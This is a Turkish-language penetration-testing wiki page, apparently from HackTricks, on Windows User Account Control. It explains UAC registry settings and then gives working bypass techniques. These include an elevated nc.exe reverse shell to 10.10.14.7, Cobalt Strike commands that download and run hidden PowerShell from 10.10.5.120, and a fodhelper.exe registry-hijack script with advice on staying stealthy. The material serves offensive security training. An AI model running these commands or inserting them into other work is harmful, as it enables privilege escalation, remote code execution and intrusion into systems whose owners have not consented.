# UAC - Kullanıcı Hesabı Denetimi

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) özelliği, **yükseltilmiş işlemler için onay istemi** sağlar. Uygulamaların farklı `integrity` seviyeleri vardır ve **yüksek seviyede** bir program **sistemi potansiyel olarak tehlikeye atabilecek** görevleri gerçekleştirebilir. UAC etkin olduğunda, bir yönetici bu uygulama/görevlerin sistemde yönetici düzeyinde çalışmasına açıkça izin vermedikçe, uygulamalar ve görevler her zaman **yönetici olmayan bir hesabın güvenlik bağlamı altında çalışır**. Bu, yöneticileri istem dışı değişikliklerden koruyan bir kolaylık özelliğidir; ancak bir güvenlik sınırı olarak kabul edilmez.

integrity seviyeleri hakkında daha fazla bilgi için:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC etkin olduğunda, bir yönetici kullanıcıya 2 token verilir: normal düzeyde işlemler yapmak için bir standart kullanıcı token'ı ve yönetici ayrıcalıklarını içeren bir token.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC'nin nasıl çalıştığını ayrıntılı olarak açıklar ve oturum açma süreci, kullanıcı deneyimi ve UAC mimarisini içerir. Yöneticiler, UAC'nin kuruluşlarına özgü nasıl çalışacağını yerel düzeyde yapılandırmak için güvenlik politikalarını (secpol.msc kullanarak) kullanabilir veya Active Directory alanı ortamında Group Policy Objects (GPO) aracılığıyla yapılandırıp dağıtabilir. Çeşitli ayarlar detaylı olarak [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) üzerinde tartışılmıştır. UAC için ayarlanabilecek 10 Group Policy ayarı vardır. Aşağıdaki tablo ek ayrıntı sağlar:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Kayıt Defteri Anahtarı   | Varsayılan Ayar                                             |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------- | ----------------------------------------------------------- |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken  | Devre Dışı                                                  |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle    | Devre Dışı                                                  |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin| Windows dışı ikili dosyalar için onay iste                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser | Güvenli masaüstünde kimlik bilgilerini iste                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection  | Etkin (ev için varsayılan) Devre Dışı (kurumsal için varsayılan) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Devre Dışı                                                |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths      | Etkin                                                       |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                 | Etkin                                                       |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop     | Etkin                                                       |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization      | Etkin                                                       |

### UAC Bypass Theory

Bazı programlar, **kullanıcı administrator grubuna aitse** **otomatik olarak yükseltilir**. Bu ikili dosyaların Manifestlerinde _autoElevate_ seçeneği değeri _True_ olarak bulunur. Ayrıca ikili dosyanın **Microsoft tarafından imzalanmış** olması gerekir.

Birçok auto-elevate işlemi, medium integrity (normal kullanıcı düzeyi ayrıcalıklarıyla) çalışan süreçlerden çağrılabilen **COM nesneleri veya RPC sunucuları aracılığıyla** işlevsellik sunar. COM (Component Object Model) ve RPC (Remote Procedure Call), Windows programlarının farklı süreçler arasında iletişim kurup işlevleri çalıştırmak için kullandığı yöntemlerdir. Örneğin, **`IFileOperation COM object`** dosya işlemlerini (kopyalama, silme, taşıma) yönetmek için tasarlanmıştır ve uyarı göstermeden ayrıcalıkları otomatik olarak yükseltebilir.

Bazı kontroller yapılabilir; örneğin sürecin **System32 dizininden** çalıştırılıp çalıştırılmadığı kontrol edilebilir. Bu tür kontroller, örneğin **explorer.exe içine inject etmek** veya başka bir System32 konumunda bulunan yürütülebilir dosyaya müdahale ederek atlatılabilir.

Bu kontrolleri atlatmanın bir başka yolu da **PEB'i değiştirmektir**. Windows'taki her sürecin Process Environment Block (PEB) adlı bir yapısı vardır; bu yapı, yürütülebilir yol gibi süreçle ilgili önemli verileri içerir. PEB'i değiştirerek, saldırganlar kendi kötü amaçlı süreçlerinin konumunu sahteleyebilir (spoof), sürecin güvenilen bir dizinden (ör. system32) çalışıyor gibi görünmesini sağlayabilir. Bu sahte bilgi, COM nesnesini uyarı göstermeden ayrıcalıkları otomatik olarak yükseltmesi için kandırır.

Daha sonra UAC'yi **atlatmak** (medium integrity seviyesinden **high** seviyeye yükselmek) için bazı saldırganlar bu tür ikili dosyaları **keyfi kod yürütmek** amacıyla kullanır; çünkü kod, **High level integrity** işlemi içinde çalıştırılacaktır.

Bir ikili dosyanın Manifest'ini kontrol etmek için Sysinternals'tan _sigcheck.exe_ aracını kullanabilirsiniz. (`sigcheck.exe -m <file>`) Ve süreçlerin **integrity level** değerini görmek için _Process Explorer_ veya _Process Monitor_ (Sysinternals) kullanabilirsiniz.

### UAC Kontrolü

UAC'nin etkin olup olmadığını doğrulamak için:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Eğer **`1`** ise UAC **etkinleştirilmiş**, eğer **`0`** ise veya **var değilse**, UAC **etkin değil**.

Sonra, **hangi seviye**nin yapılandırıldığını kontrol edin:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Eğer **`0`** ise, UAC uyarısı çıkmaz (örneğin **devre dışı**)
- Eğer **`1`** ise, yöneticiye binary'i yüksek haklarla çalıştırması için **kullanıcı adı ve parola sorulur** (on Secure Desktop)
- Eğer **`2`** (**Always notify me**) UAC, yönetici yüksek ayrıcalık gerektiren bir şeyi çalıştırmaya çalıştığında her zaman onay ister (on Secure Desktop)
- Eğer **`3`** `1` ile aynı, ancak Secure Desktop üzerinde olmak zorunda değil
- Eğer **`4`** `2` ile aynı, ancak Secure Desktop üzerinde olmak zorunda değil
- Eğer **`5`**(**default**) yöneticiye non Windows binary'leri yüksek ayrıcalıklarla çalıştırmak için onay sorar

Sonra, **`LocalAccountTokenFilterPolicy`** değerine bakmalısınız\
Eğer değer **`0`** ise, yalnızca **RID 500** kullanıcı (**built-in Administrator**) **UAC olmadan yönetici görevlerini** yapabilir, ve eğer `1` ise, **"Administrators"** grubundaki tüm hesaplar bunları yapabilir.

Ve son olarak **`FilterAdministratorToken`** anahtarının değerine bakın\
Eğer **`0`** (varsayılan), **built-in Administrator account** uzak yönetim görevlerini yapabilir ve eğer **`1`** ise built-in Administrator hesabı uzak yönetim görevlerini **yapamaz**, `LocalAccountTokenFilterPolicy` `1` olarak ayarlanmadıkça.

#### Summary

- Eğer `EnableLUA=0` veya **mevcut değilse**, **hiç kimse için UAC yok**
- Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=1`**, kimse için UAC yok
- Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=0`**, RID 500 (Built-in Administrator) için UAC yok
- Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=1`**, herkes için UAC vardır

Tüm bu bilgiler **metasploit** modülü kullanılarak toplanabilir: `post/windows/gather/win_privs`

Ayrıca kullanıcı grubunuzu kontrol edebilir ve integrity level'ınızı görebilirsiniz:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Eğer hedefe grafiksel erişiminiz varsa, UAC bypass oldukça basittir; UAC istemi göründüğünde basitçe "Yes"e tıklayabilirsiniz

UAC bypass şu durumda gereklidir: **UAC etkin, işleminiz medium integrity context içinde çalışıyor ve kullanıcı administrators group üyesi**.

Belirtmek gerekir ki, UAC en yüksek güvenlik seviyesindeyse (Always) atlatmak **diğer seviyelerden (Default) çok daha zordur**.

### UAC devre dışı

Eğer UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` is **`0`**) şu gibi bir şey kullanarak **execute a reverse shell with admin privileges** (high integrity level) çalıştırabilirsiniz:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Çok** Temel UAC "bypass" (tam dosya sistemi erişimi)

Eğer Administrators grubunda olan bir kullanıcıyla shell'e sahipseniz, SMB üzerinden paylaşılan **C$'ı mount ederek** yeni bir diske yerel olarak bağlayabilir ve dosya sistemi içindeki her şeye (hatta Administrator'ın ev klasörüne) **erişim** sağlayabilirsiniz.

> [!WARNING]
> **Görünüşe göre bu hile artık çalışmıyor**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass ile cobalt strike

Cobalt Strike teknikleri yalnızca UAC maksimum güvenlik seviyesine ayarlı değilse çalışır.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ve **Metasploit** ayrıca **UAC**'yi **bypass** etmek için birkaç modüle sahiptir.

### KRBUACBypass

Dokümantasyon ve araç: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) birkaç UAC bypass exploit'inin bir **compilation**'ıdır. Unutmayın: **compile UACME using visual studio or msbuild** gerekecektir. The compilation birkaç executables (like `Source\Akagi\outout\x64\Debug\Akagi.exe`) oluşturacaktır; **hangisine ihtiyacınız olduğunu** bilmeniz gerekecek.\
**Dikkatli olmalısınız** çünkü bazı bypass'lar **başka bazı programları tetikleyebilir** ve bu programlar **uyarı** ile **kullanıcıyı** bir şeylerin olduğunu bildirebilir.

UACME, her tekniğin çalışmaya başladığı **build version from which each technique started working** bilgisine sahiptir. Sürümlerinizi etkileyen bir teknik için arama yapabilirsiniz:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ayrıca, [this](https://en.wikipedia.org/wiki/Windows_10_version_history) sayfasını kullanarak build sürümlerinden Windows sürümü `1607`'yi elde edersiniz.

### UAC Bypass – fodhelper.exe (Registry hijack)

Güvenilen ikili `fodhelper.exe` modern Windows'ta otomatik olarak yükseltilir. Başlatıldığında, `DelegateExecute` eylemini doğrulamadan aşağıdaki kullanıcıya özel kayıt defteri yolunu sorgular. Oraya bir komut yerleştirmek, (kullanıcı Administrators grubundaysa) bir Medium Integrity sürecinin UAC istemi olmadan bir High Integrity süreci başlatmasına olanak sağlar.

fodhelper tarafından sorgulanan kayıt defteri yolu:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell adımları (payload'unuzu ayarlayın, sonra tetikleyin):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notlar:
- Geçerli kullanıcı Administrators üyesi olduğunda ve UAC seviyesi varsayılan/gevşek (Always Notify ile ekstra kısıtlamalar değil) ise çalışır.
- 64-bit Windows üzerinde 32-bit bir süreçten 64-bit PowerShell başlatmak için `sysnative` yolunu kullanın.
- Payload herhangi bir komut olabilir (PowerShell, cmd veya bir EXE yolu). Gizlilik için isteme/dialog pencereleri açmaktan kaçının.

#### Daha fazla UAC bypass

**Burada kullanılan tüm** teknikler UAC'yi atlatmak için kurbanla **full interactive shell** **gerektirir** (yaygın bir nc.exe shell yeterli değildir).

Bunu bir **meterpreter** oturumu kullanarak elde edebilirsiniz. **Session** değeri **1** olan bir **process**'e migrate edin:

![](<../../images/image (863).png>)

(_explorer.exe_ çalışmalıdır)

### GUI ile UAC Bypass

Eğer bir GUI erişiminiz varsa, UAC istemini aldığınızda onu basitçe kabul edebilirsiniz — gerçekten bir bypass'a gerek yoktur. Yani GUI erişimi UAC'yi atlamanızı sağlar.

Ayrıca, biri tarafından kullanılmış (muhtemelen RDP üzerinden) bir GUI oturumu elde ederseniz, bazı araçlar yönetici olarak çalışıyor olacak; bu araçlardan örneğin bir **cmd**'yi **as admin** olarak doğrudan çalıştırabilirsiniz ve UAC tarafından tekrar istenmez — örnek: [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Bu biraz daha **stealthy** olabilir.

### Gürültülü brute-force UAC bypass

Eğer gürültü yapmayı umursamıyorsanız, kullanıcı kabul edene kadar izinleri yükseltmeyi isteyen [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir aracı her zaman çalıştırabilirsiniz.

### Kendi bypass'ınız - Temel UAC bypass metodolojisi

Eğer **UACME**'ye bakarsanız, çoğu UAC bypass'ının bir **Dll Hijacking** zafiyetinden yararlandığını görürsünüz (çoğunlukla kötü amaçlı dll'i _C:\Windows\System32_ içine yazarak). Dll Hijacking zafiyetini nasıl bulacağınızı öğrenmek için [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. **autoelevate** yapacak bir binary bulun (çalıştırıldığında yüksek integrity level'da çalıştığını kontrol edin).
2. procmon ile **NAME NOT FOUND** olaylarını bulun; bunlar **DLL Hijacking** için kırılgan olabilir.
3. Muhtemelen yazma izniniz olmayan bazı **korumalı yollar**a (ör. C:\Windows\System32) DLL yazmanız gerekecek. Bunu şu yollarla atlayabilirsiniz:
   1. **wusa.exe**: Windows 7, 8 ve 8.1. Bu araç protected paths içine bir CAB dosyasının içeriğini çıkarmanıza izin verir (çünkü bu araç yüksek integrity level'da çalıştırılır).
   2. **IFileOperation**: Windows 10.
4. DLL'inizi korumalı yola kopyalayıp zafiyetli ve autoelevated binary'i çalıştıracak bir **script** hazırlayın.

### Başka bir UAC bypass tekniği

Bir **autoElevated binary**'nin **registry**'den çalıştırılacak bir **binary** veya **command**'ın **name/path**'ini **read** etmeye çalışıp çalışmadığını izlemeye dayanır (binary bu bilgiyi **HKCU** içinde arıyorsa bu daha ilgi çekicidir).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
